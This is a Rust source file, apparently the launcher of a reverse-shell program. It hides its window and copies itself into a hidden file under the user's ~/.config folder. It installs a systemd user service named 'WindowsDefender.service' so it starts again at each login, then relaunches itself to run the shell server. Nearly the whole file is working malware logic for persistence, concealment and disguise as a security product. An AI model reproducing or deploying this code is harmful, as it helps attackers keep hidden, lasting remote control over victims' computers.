#![windows_subsystem = "windows"]

use std::env;
use std::process::Command;
use std::fs;
use std::path::Path;
use ReverseShell::server::start_server;

fn main() {
    let args: Vec<String> = env::args().collect();

    let current_path = env::current_exe().expect("Failed to get current executable path");

    let service_name = "WindowsDefender.service";
    let service_path = format!("{}/.config/systemd/user/{}", dirs::home_dir().unwrap().display(), service_name);

    // Check if the service file exists
    if !Path::new(&service_path).exists() {
        // copy the executable to the home directorys .config folder hidden in linux
        fs::copy(&current_path, format!("{}/.config/.{}", dirs::home_dir().unwrap().display(), current_path.file_name().unwrap().to_str().unwrap())).expect("Unable to copy file");
        // Create the service file
        fs::write(&service_path, format!("[Service]\nExecStart={}\n\n[Install]\nWantedBy=default.target\n", format!("{}/.config/.{}", dirs::home_dir().unwrap().display(), current_path.file_name().unwrap().to_str().unwrap()))).expect("TODO: panic message");

        // Enable the service
        Command::new("systemctl")
            .arg("--user")
            .arg("enable")
            .arg(service_name)
            .output()
            .expect("Failed to enable service");
    } else {
        println!("Service file already exists. Skipping creation.\n");
    }

    if args.len() > 1 && args[1] == "-SS" {
        start_server();
    } else {
        Command::new(current_path)
            .args(&["-SS"])
            .spawn()
            .expect("Failed to start server with -SS argument");
    }
}